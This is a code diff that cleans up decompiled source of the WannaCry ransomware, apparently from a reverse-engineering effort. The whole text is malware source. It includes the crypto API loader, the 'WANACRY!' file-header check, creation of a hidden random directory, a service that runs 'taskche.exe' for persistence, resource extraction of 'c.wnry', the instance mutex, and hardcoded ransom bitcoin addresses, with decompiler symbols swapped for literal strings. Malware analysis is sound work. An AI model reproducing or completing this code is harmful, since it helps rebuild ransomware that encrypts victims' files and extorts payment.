@@ -826,7 +826,6 @@ undefined4 run_command(LPSTR param_1, DWORD param_2, LPDWORD param_3) {
 undefined4 set_or_query_registry_cwd(int set_registry) {
 	size_t current_dir_length;
 	LSTATUS LVar1;
-	int iVar2;
 	undefined4 *software_str;
 	undefined4 *puVar3;
 	bool bVar4;
@@ -844,13 +843,11 @@ undefined4 set_or_query_registry_cwd(int set_registry) {
 	strcpy(software_str_buf, software_str); // or memcpy(software_str_buf,software_str,5)
 
 	registry_value = '\0';
-	iVar2 = 0x2d;
 	regWanaHandle = NULL;
 	software_str = local_c4;
 
 	memset(software_str, 0, 45);
 
-	iVar2 = 0x81;
 	software_str = &local_2df;
 
 	memset(software_str, 0, 129);
@@ -1130,7 +1127,7 @@ byte * __thiscall FUN_004014a6(void *this,LPCSTR param_1,uint *param_2) {
 			iVar2 = (*_DAT_0040f880)(hFile,&local_240,8,local_20,0);
 			
 			if (iVar2 != 0) {
-				iVar2 = memcmp(&local_240,s_WANACRY__0040eb7c,8);
+				iVar2 = memcmp(&local_240,"WANACRY!",8);
 				
 				if (iVar2 == 0) {
 					iVar2 = (*_DAT_0040f880)(hFile,&local_248,4,local_20,0);
@@ -1151,7 +1148,7 @@ byte * __thiscall FUN_004014a6(void *this,LPCSTR param_1,uint *param_2) {
 										FUN_00402a76((void *)((int)this + 0x54),local_230,(uint *)PTR_DAT_0040f578,local_30,(byte *)0x10);
 										local_2c = (byte *)GlobalAlloc(0,local_238);
 										
-										if (local_2c != (byte *)0x0) {
+										if (local_2c != NULL) {
 											iVar2 = (*_DAT_0040f880)(hFile,*(undefined4 *)((int)this + 0x4c8),local_28,local_20,0);
 											pbVar1 = local_2c;
 										
@@ -1227,668 +1224,659 @@ undefined4 * __thiscall FUN_004017ff(void *this,byte param_1) {
 void __fastcall FUN_0040181b(undefined4 *param_1) {
 	*param_1 = 0x4081ec;
 	DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
-return;
+	return;
 }
 
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
 undefined4 __fastcall FUN_0040182c(int param_1) {
-  int iVar1;
-  int iVar2;
-  
-  iVar2 = 0;
-  do {
-	iVar1 = (*_DAT_0040f894)(param_1 + 4,0,-(uint)(iVar2 != 0) & 0x40f08c,0x18,0xf0000000);
-	if (iVar1 != 0) {
-	  return 1;
-	}
-	iVar2 = iVar2 + 1;
-  } while (iVar2 < 2);
-  return 0;
+	int iVar1;
+	int iVar2;
+
+	iVar2 = 0;
+	do {
+		iVar1 = (*_DAT_0040f894)(param_1 + 4,0,-(uint)(iVar2 != 0) & 0x40f08c,0x18,0xf0000000);
+		
+		if (iVar1 != 0) {
+			return 1;
+		}
+		
+		iVar2 = iVar2 + 1;
+	} while (iVar2 < 2);
+	
+	return 0;
 }
 
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
 undefined4 __thiscall FUN_00401861(void *this,LPCSTR param_1) {
-  int iVar1;
-  
-  iVar1 = FUN_0040182c((int)this);
-  if (iVar1 != 0) {
-	if (param_1 == (LPCSTR)0x0) {
-	  iVar1 = (*_DAT_0040f898)(*(undefined4 *)((int)this + 4),&DAT_0040ebf8,0x494,0,0,(int)this + 8)
-	  ;
-	}
-	else {
-	  iVar1 = FUN_004018f9(*(undefined4 *)((int)this + 4),(int)this + 8,param_1);
-	}
+	int iVar1;
+
+	iVar1 = FUN_0040182c((int)this);
 	if (iVar1 != 0) {
-	  return 1;
+		if (param_1 == NULL) {
+			iVar1 = (*_DAT_0040f898)(*(undefined4 *)((int)this + 4),&DAT_0040ebf8,0x494,0,0,(int)this + 8);
+		} else {
+			iVar1 = FUN_004018f9(*(undefined4 *)((int)this + 4),(int)this + 8,param_1);
+		}
+	
+		if (iVar1 != 0) {
+			return 1;
+		}
 	}
-  }
-  FUN_004018b9((int)this);
-  return 0;
+	
+	FUN_004018b9((int)this);
+	return 0;
 }
 
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
 undefined4 __fastcall FUN_004018b9(int param_1) {
-  if (*(int *)(param_1 + 8) != 0) {
-	(*_DAT_0040f89c)(*(int *)(param_1 + 8));
-	*(undefined4 *)(param_1 + 8) = 0;
-  }
-  if (*(int *)(param_1 + 0xc) != 0) {
-	(*_DAT_0040f89c)(*(int *)(param_1 + 0xc));
-	*(undefined4 *)(param_1 + 0xc) = 0;
-  }
-  if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
-	CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
-	*(undefined4 *)(param_1 + 4) = 0;
-  }
-  return 1;
+	if (*(int *)(param_1 + 8) != 0) {
+		(*_DAT_0040f89c)(*(int *)(param_1 + 8));
+		*(undefined4 *)(param_1 + 8) = 0;
+	}
+	
+	if (*(int *)(param_1 + 0xc) != 0) {
+		(*_DAT_0040f89c)(*(int *)(param_1 + 0xc));
+		*(undefined4 *)(param_1 + 0xc) = 0;
+	}
+	
+	if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
+		CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4),0);
+		*(undefined4 *)(param_1 + 4) = 0;
+	}
+	
+	return 1;
 }
 
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
 undefined4 FUN_004018f9(undefined4 param_1,undefined4 param_2,LPCSTR param_3) {
-  HANDLE hFile;
-  DWORD dwBytes;
-  HGLOBAL lpBuffer;
-  BOOL BVar1;
-  int iVar2;
-  undefined4 uVar3;
-  undefined4 *in_FS_OFFSET;
-  DWORD local_20 [3];
-  undefined4 local_14;
-  undefined *puStack16;
-  undefined *puStack12;
-  undefined4 local_8;
-  
-  puStack12 = &DAT_004081f0;
-  puStack16 = &DAT_004076f4;
-  local_14 = *in_FS_OFFSET;
-  *(undefined4 **)in_FS_OFFSET = &local_14;
-  uVar3 = 0;
-  local_20[0] = 0;
-  local_8 = 0;
-  hFile = CreateFileA(param_3,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
-  if (hFile != (HANDLE)0xffffffff) {
-	dwBytes = GetFileSize(hFile,(LPDWORD)0x0);
-	if ((dwBytes != 0xffffffff) && (dwBytes < 0x19001)) {
-	  lpBuffer = GlobalAlloc(0,dwBytes);
-	  if (lpBuffer != (HGLOBAL)0x0) {
-		BVar1 = ReadFile(hFile,lpBuffer,dwBytes,local_20,(LPOVERLAPPED)0x0);
-		if (BVar1 != 0) {
-		  iVar2 = (*_DAT_0040f898)(param_1,lpBuffer,local_20[0],0,0,param_2);
-		  if (iVar2 != 0) {
-			uVar3 = 1;
-		  }
+	HANDLE hFile;
+	DWORD dwBytes;
+	HGLOBAL lpBuffer;
+	BOOL BVar1;
+	int iVar2;
+	undefined4 uVar3;
+	undefined4 *in_FS_OFFSET;
+	DWORD local_20 [3];
+	undefined4 local_14;
+	undefined *puStack16;
+	undefined *puStack12;
+	undefined4 local_8;
+
+	puStack12 = &DAT_004081f0;
+	puStack16 = &DAT_004076f4;
+	local_14 = *in_FS_OFFSET;
+	*(undefined4 **)in_FS_OFFSET = &local_14;
+	uVar3 = 0;
+	local_20[0] = 0;
+	local_8 = 0;
+	hFile = CreateFileA(param_3,0x80000000,1,NULL,3,0,NULL);
+	if (hFile != (HANDLE)0xffffffff) {
+		dwBytes = GetFileSize(hFile,NULL);
+		if ((dwBytes != 0xffffffff) && (dwBytes < 0x19001)) {
+			lpBuffer = GlobalAlloc(0,dwBytes);
+			if (lpBuffer != NULL) {
+				BVar1 = ReadFile(hFile,lpBuffer,dwBytes,local_20,NULL);
+				if (BVar1 != 0) {
+					iVar2 = (*_DAT_0040f898)(param_1,lpBuffer,local_20[0],0,0,param_2);
+					if (iVar2 != 0) {
+						uVar3 = 1;
+					}
+				}
+			}
 		}
-	  }
 	}
-  }
-  _local_unwind2(&local_14,0xffffffff);
-  *in_FS_OFFSET = local_14;
-  return uVar3;
+	_local_unwind2(&local_14,0xffffffff);
+	*in_FS_OFFSET = local_14;
+	return uVar3;
 }
 
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
 undefined4 __thiscall FUN_004019e1(void *this,void *param_1,size_t param_2,void *param_3,size_t *param_4) {
-  LPCRITICAL_SECTION lpCriticalSection;
-  int iVar1;
-  
-  if (*(int *)((int)this + 8) != 0) {
-	lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x10);
-	EnterCriticalSection(lpCriticalSection);
-	iVar1 = (*_DAT_0040f8a4)(*(undefined4 *)((int)this + 8),0,1,0,param_1,&param_2);
-	if (iVar1 != 0) {
-	  LeaveCriticalSection(lpCriticalSection);
-	  memcpy(param_3,param_1,param_2);
-	  *param_4 = param_2;
-	  return 1;
+	LPCRITICAL_SECTION lpCriticalSection;
+	int iVar1;
+
+	if (*(int *)((int)this + 8) != 0) {
+		lpCriticalSection = (LPCRITICAL_SECTION)((int)this + 0x10);
+		EnterCriticalSection(lpCriticalSection);
+		iVar1 = (*_DAT_0040f8a4)(*(undefined4 *)((int)this + 8),0,1,0,param_1,&param_2);
+	
+		if (iVar1 != 0) {
+			LeaveCriticalSection(lpCriticalSection);
+			memcpy(param_3,param_1,param_2);
+			*param_4 = param_2;
+			return 1;
+		}
+	
+		LeaveCriticalSection(lpCriticalSection);
 	}
-	LeaveCriticalSection(lpCriticalSection);
-  }
-  return 0;
+	return 0;
 }
 
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
 undefined4 FUN_00401a45(void) {
-  HMODULE hModule;
-  undefined4 uVar1;
-  
-  if (_DAT_0040f894 == (FARPROC)0x0) {
-	hModule = LoadLibraryA(s_advapi32_dll_0040e020);
-	if (hModule != (HMODULE)0x0) {
-	  _DAT_0040f894 = GetProcAddress(hModule,s_CryptAcquireContextA_0040f110);
-	  _DAT_0040f898 = GetProcAddress(hModule,s_CryptImportKey_0040f100);
-	  _DAT_0040f89c = GetProcAddress(hModule,s_CryptDestroyKey_0040f0f0);
-	  _DAT_0040f8a0 = GetProcAddress(hModule,s_CryptEncrypt_0040f0e0);
-	  _DAT_0040f8a4 = GetProcAddress(hModule,s_CryptDecrypt_0040f0d0);
-	  _DAT_0040f8a8 = GetProcAddress(hModule,s_CryptGenKey_0040f0c4);
-	  if ((((_DAT_0040f894 != (FARPROC)0x0) && (_DAT_0040f898 != (FARPROC)0x0)) &&
-		  (_DAT_0040f89c != (FARPROC)0x0)) &&
-		 (((_DAT_0040f8a0 != (FARPROC)0x0 && (_DAT_0040f8a4 != (FARPROC)0x0)) &&
-		  (_DAT_0040f8a8 != (FARPROC)0x0)))) goto LAB_00401aec;
+	HMODULE hModule;
+	undefined4 uVar1;
+
+	if (_cryptAcquireContextA == NULL) {
+		hModule = LoadLibraryA("advapi32.dll");
+		if (hModule != NULL) {
+			_cryptAcquireContextA = GetProcAddress(hModule,"CryptAcquireContextA");
+			_cryptImportKey = GetProcAddress(hModule,"CryptImportKey");
+			_cryptDestroyKey = GetProcAddress(hModule,"CryptDestroyKey");
+			_cryptEncrypt = GetProcAddress(hModule,"CryptEncrypt");
+			_cryptDecrypt = GetProcAddress(hModule,"CryptDecrypt");
+			_cryptGenKey = GetProcAddress(hModule,"CryptGenKey");
+			if ((((_cryptAcquireContextA != NULL) && (_cryptImportKey != NULL)) && (_cryptDestroyKey != NULL)) && (((_cryptEncrypt != NULL && (_cryptDecrypt != NULL) && (_cryptGenKey != NULL)))) goto LAB_00401aec;
+		}
+	
+		uVar1 = 0;
+	} else {
+		LAB_00401aec:
+		uVar1 = 1;
 	}
-	uVar1 = 0;
-  }
-  else {
-LAB_00401aec:
-	uVar1 = 1;
-  }
-  return uVar1;
+	
+	return uVar1;
 }
 
 int create_and_cwd_dir(LPCWSTR dir_1,LPCWSTR dir_2,wchar_t *dir_out) {
-  BOOL BVar1;
-  DWORD DVar2;
-  
-  CreateDirectoryW(dir_1,(LPSECURITY_ATTRIBUTES)0x0);
-  BVar1 = SetCurrentDirectoryW(dir_1);
-  if (BVar1 != 0) {
-	CreateDirectoryW(dir_2,(LPSECURITY_ATTRIBUTES)0x0);
+	BOOL BVar1;
+	DWORD DVar2;
 
-	// Set file/folder to hidden & system
-	BVar1 = SetCurrentDirectoryW(dir_2);
+	CreateDirectoryW(dir_1,NULL);
+	BVar1 = SetCurrentDirectoryW(dir_1);
 	if (BVar1 != 0) {
-	  DVar2 = GetFileAttributesW(dir_2);
-	  SetFileAttributesW(dir_2,DVar2 | 6);
-	  if (dir_out != (wchar_t *)0x0) {
-		// u__s__s_0040eb88 = 
-		swprintf(dir_out,u__s__s_0040eb88,dir_1,dir_2);
-	  }
-	  return 1;
+		CreateDirectoryW(dir_2,NULL);
+
+		// Set file/folder to hidden & system
+		BVar1 = SetCurrentDirectoryW(dir_2);
+		if (BVar1 != 0) {
+			DVar2 = GetFileAttributesW(dir_2);
+			SetFileAttributesW(dir_2,DVar2 | 6);
+			if (dir_out != NULL) {
+				swprintf(dir_out,"%s\\%s",dir_1,dir_2);
+			}
+			return 1;
+		}
 	}
-  }
-  return 0;
+	return 0;
 }
 
 uint create_and_cwd_random_hidden_directory(wchar_t *cwd_out) {
-  DWORD pd_attr;
-  wchar_t *pwVar1;
-  int iVar2;
-  undefined4 *puVar3;
-  WCHAR programdata_path;
-  undefined4 local_2d2 [129];
-  WCHAR randomstring_w;
-  undefined4 local_ca [49];
-  
-  iVar2 = 0x81;
-  puVar3 = (undefined4 *)&stack0xfffffb26;
-  
-  while (iVar2 != 0) {
-	iVar2 = iVar2 + -1;
-	*puVar3 = 0;
-	puVar3 = puVar3 + 1;
-  }
-  
-  *(undefined2 *)puVar3 = 0;
-  iVar2 = 0x81;
-  programdata_path = DAT_0040f874;
-  puVar3 = local_2d2;
-  
-  while (iVar2 != 0) {
-	iVar2 = iVar2 + -1;
-	*puVar3 = 0;
-	puVar3 = puVar3 + 1;
-  }
-  
-  *(undefined2 *)puVar3 = 0;
-  iVar2 = 0x31;
-  randomstring_w = DAT_0040f874;
-  puVar3 = local_ca;
-  
-  while (iVar2 != 0) {
-	iVar2 = iVar2 + -1;
-	*puVar3 = 0;
-	puVar3 = puVar3 + 1;
-  }
+	DWORD pd_attr;
+	wchar_t *pwVar1;
+	int iVar2;
+	undefined4 *puVar3;
+	WCHAR programdata_path;
+	undefined4 local_2d2 [129];
+	WCHAR randomstring_w;
+	undefined4 local_ca [49];
 
-  *(undefined2 *)puVar3 = 0;
-  MultiByteToWideChar(0,0,(LPCSTR)&randomstring,-1,&randomstring_w,99);
-  
-  // gets C:\ or C:\Windows
-  GetWindowsDirectoryW((LPWSTR)&stack0xfffffb24,0x104);
+	iVar2 = 0x81;
+	puVar3 = (undefined4 *)&stack0xfffffb26;
 
-  // u__s_ProgramData_0040f40c = C:\ProgramData or C:\Windows\ProgramData
-  // C:\ProgramData or C:\Windows\ProgramData
+	memset(puVar3, 0, 129);
 
-  swprintf(&programdata_path,u__s_ProgramData_0040f40c,&stack0xfffffb24);
-  pd_attr = GetFileAttributesW(&programdata_path);
-  
-  if ((pd_attr == 0xffffffff) ||
-	  
-	 (iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out), iVar2 == 0)) {
-	
-	//u__s_Intel_0040f3f8 = C:\Intel or C:\Windows\Intel
-	// C:\Intel or C:\Windows\Intel
-	swprintf(&programdata_path,u__s_Intel_0040f3f8,(wchar_t *)&stack0xfffffb24);
-	iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);
-	
-	if ((iVar2 == 0) &&
-	   (iVar2 = create_and_cwd_dir((LPCWSTR)&stack0xfffffb24,&randomstring_w,cwd_out), iVar2 == 0 /*C:\*randomstring* */))
-	{
-	  GetTempPathW(0x104,&programdata_path);
-	  pwVar1 = wcsrchr(&programdata_path,L'\\');
-	
-	  if (pwVar1 != (wchar_t *)0x0) {
-		pwVar1 = wcsrchr(&programdata_path,L'\\');
-		*pwVar1 = L'\0';
-	  }
-	
-	  iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);
-	
-	  return (uint)(iVar2 != 0);
+	*(undefined2 *)puVar3 = 0;
+	iVar2 = 0x81;
+	programdata_path = DAT_0040f874;
+	puVar3 = local_2d2;
+
+	memset(puVar3, 0, 129);
+
+	*(undefined2 *)puVar3 = 0;
+	iVar2 = 0x31;
+	randomstring_w = DAT_0040f874;
+	puVar3 = local_ca;
+
+	memset(puVar3, 0, 49);
+
+	*(undefined2 *)puVar3 = 0;
+	MultiByteToWideChar(0, 0, (LPCSTR)&randomstring, -1, &randomstring_w,99);
+
+	// gets C:\ or C:\Windows
+	GetWindowsDirectoryW((LPWSTR)&stack0xfffffb24,0x104);
+
+	// C:\ProgramData or C:\Windows\ProgramData
+	swprintf(&programdata_path,"%s\\ProgramData",&stack0xfffffb24);
+	pd_attr = GetFileAttributesW(&programdata_path);
+
+	if ((pd_attr == 0xffffffff) || (iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out), iVar2 == 0)) {
+
+		// C:\Intel or C:\Windows\Intel
+		swprintf(&programdata_path,"%s\\Intel",(wchar_t *)&stack0xfffffb24);
+		iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);
+
+		if ((iVar2 == 0) && (iVar2 = create_and_cwd_dir((LPCWSTR)&stack0xfffffb24,&randomstring_w,cwd_out), iVar2 == 0 /*C:\*randomstring* */)) {
+			GetTempPathW(0x104,&programdata_path);
+			pwVar1 = wcsrchr(&programdata_path,L'\\');
+
+			if (pwVar1 != NULL) {
+				pwVar1 = wcsrchr(&programdata_path,L'\\');
+				*pwVar1 = L'\0';
+			}
+
+			iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);
+
+			return (uint)(iVar2 != 0);
+		}
 	}
-  }
-  
-  return 1;
+
+return 1;
 }
 
 undefined4 create_taskche_service(char *path_to_taskche) {
-  undefined4 uVar1;
-  SC_HANDLE hService;
-  CHAR local_410 [1024];
-  SC_HANDLE randomstring_service;
-  undefined4 local_c;
-  SC_HANDLE scmanager;
-  
-  local_c = 0;
-  scmanager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
-  
-  if (scmanager == (SC_HANDLE)0x0) {
-	uVar1 = 0;
-  } else {
-	randomstring_service = OpenServiceA(scmanager,(LPCSTR)&randomstring,0xf01ff);
-	
-	if (randomstring_service == (SC_HANDLE)0x0) {
+	undefined4 uVar1;
+	SC_HANDLE hService;
+	CHAR local_410 [1024];
+	SC_HANDLE randomstring_service;
+	undefined4 local_c;
+	SC_HANDLE scmanager;
 
-	  // s_cmd_exe__c___s__0040f42c = cmd.exe /c \"%s
-	  sprintf(local_410,s_cmd_exe__c___s__0040f42c,path_to_taskche);
-	  hService = CreateServiceA(scmanager,(LPCSTR)&randomstring,(LPCSTR)&randomstring,0xf01ff,0x10,2
-								,1,local_410,(LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,
-								(LPCSTR)0x0);
-	  uVar1 = local_c;
-	  
-	  if (hService != (SC_HANDLE)0x0) {
-		StartServiceA(hService,0,(LPCSTR *)0x0);
-		CloseServiceHandle(hService);
-		local_c = 1;
-		uVar1 = local_c;
-	  }
+	local_c = 0;
+	scmanager = OpenSCManagerA(NULL, NULL, 0xf003f);
 
+	if (scmanager == NULL) {
+		uVar1 = 0;
 	} else {
-	  StartServiceA(randomstring_service,0,(LPCSTR *)0x0);
-	  CloseServiceHandle(randomstring_service);
-	  uVar1 = 1;
-	}
+		randomstring_service = OpenServiceA(scmanager,(LPCSTR)&randomstring,0xf01ff);
 
-	CloseServiceHandle(scmanager);
-  }
+		if (randomstring_service == NULL) {
 
-  return uVar1;
+			sprintf(local_410, "cmd.exe /c \"%s", path_to_taskche);
+			hService = CreateServiceA(scmanager, (LPCSTR)&randomstring, (LPCSTR)&randomstring, 0xf01ff, 0x10, 2, 1, local_410, NULL, NULL, NULL, NULL, NULL);
+			uVar1 = local_c;
+			
+			if (hService != NULL) {
+				StartServiceA(hService, 0, NULL);
+				CloseServiceHandle(hService);
+				local_c = 1;
+				uVar1 = local_c;
+			}
+
+			} else {
+				StartServiceA(randomstring_service, 0, NULL);
+				CloseServiceHandle(randomstring_service);
+				uVar1 = 1;
+			}
+
+			CloseServiceHandle(scmanager);
+		}
+
+	return uVar1;
 }
 
 undefined4 FUN_00401dab(HMODULE param_1,char *param_2) {
-  HRSRC hResInfo;
-  HGLOBAL hResData;
-  LPVOID pvVar1;
-  DWORD DVar2;
-  int *piVar3;
-  int iVar4;
-  int iVar5;
-  undefined4 *puVar6;
-  char *pcVar7;
-  int local_130;
-  undefined4 local_12c [74];
-  
-  hResInfo = FindResourceA(param_1,(LPCSTR)2058,&DAT_0040f43c);
-  if (((hResInfo != (HRSRC)0x0) &&
-	  (hResData = LoadResource(param_1,hResInfo), hResData != (HGLOBAL)0x0)) &&
-	 (pvVar1 = LockResource(hResData), pvVar1 != (LPVOID)0x0)) {
-	DVar2 = SizeofResource(param_1,hResInfo);
-	piVar3 = (int *)FUN_004075ad(pvVar1,DVar2,param_2);
-	if (piVar3 != (int *)0x0) {
-	  local_130 = 0;
-	  iVar5 = 0x4a;
-	  puVar6 = local_12c;
+	HRSRC hResInfo;
+	HGLOBAL hResData;
+	LPVOID pvVar1;
+	DWORD DVar2;
+	int *piVar3;
+	int iVar4;
+	int iVar5;
+	undefined4 *puVar6;
+	char *pcVar7;
+	int local_130;
+	undefined4 local_12c [74];
 
-	  while (iVar5 != 0) {
-		iVar5 = iVar5 + -1;
-		*puVar6 = 0;
-		puVar6 = puVar6 + 1;
-	  }
-	  
-	  FUN_004075c4(piVar3,(char *)0xffffffff,&local_130);
-	  
-	  iVar5 = local_130;
-	  pcVar7 = (char *)0x0;
-	  
-	  if (0 < local_130) {
-		do {
-		  FUN_004075c4(piVar3,pcVar7,&local_130);
-		  iVar4 = strcmp((char *)local_12c,s_c_wnry_0040e010);
-		  if ((iVar4 != 0) || (DVar2 = GetFileAttributesA((LPCSTR)local_12c), DVar2 == 0xffffffff)) {
-			FUN_0040763d(piVar3,pcVar7,(char *)local_12c);
-		  }
+	hResInfo = FindResourceA(param_1,(LPCSTR)2058,"XIA");
+	if (((hResInfo != NULL) && (hResData = LoadResource(param_1,hResInfo), hResData != NULL)) && (pvVar1 = LockResource(hResData), pvVar1 != NULL)) {
+		DVar2 = SizeofResource(param_1,hResInfo);
+		piVar3 = (int *)FUN_004075ad(pvVar1,DVar2,param_2);
 
-		  pcVar7 = pcVar7 + 1;
-		} while ((int)pcVar7 < iVar5);
-	  }
-	  
-	  FUN_00407656(piVar3);
-	  return 1;
+		if (piVar3 != (int *)0x0) {
+			local_130 = 0;
+			iVar5 = 0x4a;
+			puVar6 = local_12c;
+
+			memset(puVar6, 0, 74);
+
+			FUN_004075c4(piVar3,(char *)0xffffffff,&local_130);
+
+			iVar5 = local_130;
+			pcVar7 = (char *)0x0;
+
+			if (0 < local_130) {
+				do {
+					FUN_004075c4(piVar3,pcVar7,&local_130);
+					iVar4 = strcmp((char *)local_12c,"c.wnry");
+					if ((iVar4 != 0) || (DVar2 = GetFileAttributesA((LPCSTR)local_12c), DVar2 == 0xffffffff)) {
+						FUN_0040763d(piVar3,pcVar7,(char *)local_12c);
+					}
+
+					pcVar7 = pcVar7 + 1;
+				} while ((int)pcVar7 < iVar5);
+			}
+
+			FUN_00407656(piVar3);
+			return 1;
+		}
 	}
-  }
 
   return 0;
 }
 
 void bitcoin_something(void) {
-  uint uVar1;
-  int iVar2;
-  undefined local_31c [178];
-  char local_26a [602];
-  char *bitcoin_addresses [3];
-  
-  // s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488 = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94"
-  // s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464 = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"
-  // s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440 = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn"
+	uint uVar1;
+	int iVar2;
+	undefined local_31c [178];
+	char local_26a [602];
+	char *bitcoin_addresses [3];
 
-  bitcoin_addresses[0] = s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488;
-  bitcoin_addresses[1] = s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464;
-  bitcoin_addresses[2] = s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440;
-  uVar1 = FUN_00401000(local_31c,1);
+	// s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488 = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94"
+	// s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464 = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw"
+	// s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440 = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn"
 
-  if (uVar1 != 0) {
-	iVar2 = rand();
-	strcpy(local_26a,local_10[iVar2 % 3]);
-	FUN_00401000(local_31c,0);
-  }
+	bitcoin_addresses[0] = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94";
+	bitcoin_addresses[1] = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw";
+	bitcoin_addresses[2] = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn";
+	
+	uVar1 = FUN_00401000(local_31c,1);
 
-  return;
+	if (uVar1 != 0) {
+		iVar2 = rand();
+		strcpy(local_26a,local_10[iVar2 % 3]);
+		FUN_00401000(local_31c,0);
+	}
+
+	return;
 }
 
 undefined4 acquire_taskche_mutex(int number_of_tries) {
-  HANDLE hObject;
-  int iVar1;
-  char local_68 [100];
-  
-  sprintf(local_68,"%s%d","Global\\MsWinZonesCacheCounterMutexA",0);
-  iVar1 = 0;
-  
-  // if mutex acquisition is successful return 1 
-  if (0 < number_of_tries) {
-	do {
-	  hObject = OpenMutexA(0x100000,1,local_68);
-	  if (hObject != NULL) {
-		CloseHandle(hObject);
-		return 1;
-	  }
+	HANDLE hObject;
+	int iVar1;
+	char local_68 [100];
 
-	  // sleep and try again
-	  Sleep(1000);
-	  iVar1 = iVar1 + 1;
-	} while (iVar1 < number_of_tries);
-  }
+	sprintf(local_68,"%s%d","Global\\MsWinZonesCacheCounterMutexA",0);
+	iVar1 = 0;
 
-  // if mutex couldn't be acquired return 0
-  return 0;
+	// if mutex acquisition is successful return 1 
+	if (0 < number_of_tries) {
+		do {
+			hObject = OpenMutexA(0x100000,1,local_68);
+			if (hObject != NULL) {
+				CloseHandle(hObject);
+				return 1;
+			}
+
+			// sleep and try again
+			Sleep(1000);
+			iVar1 = iVar1 + 1;
+		} while (iVar1 < number_of_tries);
+	}
+
+	// if mutex couldn't be acquired return 0
+	return 0;
 }
 
 undefined4 create_or_start_taskche_service(void) {
-  int iVar1;
-  undefined4 *puVar2;
-  char path_to_taskche;
-  undefined4 local_20b;
-  
-  path_to_taskche = DAT_0040f910;
-  iVar1 = 0x81;
-  puVar2 = &local_20b;
+	int iVar1;
+	undefined4 *puVar2;
+	char path_to_taskche;
+	undefined4 local_20b;
 
-  memset(puVar2, 0, 129);
+	path_to_taskche = DAT_0040f910;
+	iVar1 = 0x81;
+	puVar2 = &local_20b;
 
-  *(undefined2 *)puVar2 = 0;
-  *(undefined *)((int)puVar2 + 2) = 0;
-  GetFullPathNameA("taskche.exe", 520, &path_to_taskche, NULL);
-  
-  iVar1 = create_taskche_service(&path_to_taskche);
-  
-  if ((iVar1 != 0) && (iVar1 = acquire_taskche_mutex(0x3c), iVar1 != 0)) {
-	return 1;
-  }
-  
-  iVar1 = run_command(&path_to_taskche, 0, NULL);
-  
-  if ((iVar1 != 0) && (iVar1 = acquire_taskche_mutex(0x3c), iVar1 != 0)) {
-	return 1;
-  }
-  
-  return 0;
+	memset(puVar2, 0, 129);
+
+	*(undefined2 *)puVar2 = 0;
+	*(undefined *)((int)puVar2 + 2) = 0;
+	GetFullPathNameA("taskche.exe", 520, &path_to_taskche, NULL);
+
+	iVar1 = create_taskche_service(&path_to_taskche);
+
+	if ((iVar1 != 0) && (iVar1 = acquire_taskche_mutex(0x3c), iVar1 != 0)) {
+		return 1;
+	}
+
+	iVar1 = run_command(&path_to_taskche, 0, NULL);
+
+	if ((iVar1 != 0) && (iVar1 = acquire_taskche_mutex(0x3c), iVar1 != 0)) {
+		return 1;
+	}
+
+	return 0;
 }
 
 int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdShow) {
-  
-  int *argc;
-  char ***argv;
-  uint uVar1;
-  DWORD DVar2;
-  short *psVar3;
-  code *pcVar4;
-  int arg1_cmp;
-  undefined4 *puVar5;
-  char *_s__i;
-  undefined local_6e8 [1240];
-  char filename [520];
-  uint local_8;
-  
-  filename[0] = DAT_0040f910;
-  arg1_cmp = 0x81;
-  puVar5 = (undefined4 *)(filename + 1);
-  
-  //memset
-  while (arg1_cmp != 0) {
-	arg1_cmp = arg1_cmp + -1;
-	*puVar5 = 0;
-	puVar5 = puVar5 + 1;
-  }
+	int *argc;
+	char ***argv;
+	uint uVar1;
+	DWORD DVar2;
+	short *psVar3;
+	code *pcVar4;
+	int arg1_cmp;
+	undefined4 *puVar5;
+	char *slash_i;
+	undefined local_6e8 [1240];
+	char filename [520];
+	uint local_8;
 
-  *(undefined2 *)puVar5 = 0;
-  *(undefined *)((int)puVar5 + 2) = 0;
-  GetModuleFileNameA(NULL,filename,520);
-  randomstring_generator((char *)&randomstring);
+	filename[0] = DAT_0040f910;
+	arg1_cmp = 0x81;
+	puVar5 = (undefined4 *)(filename + 1);
 
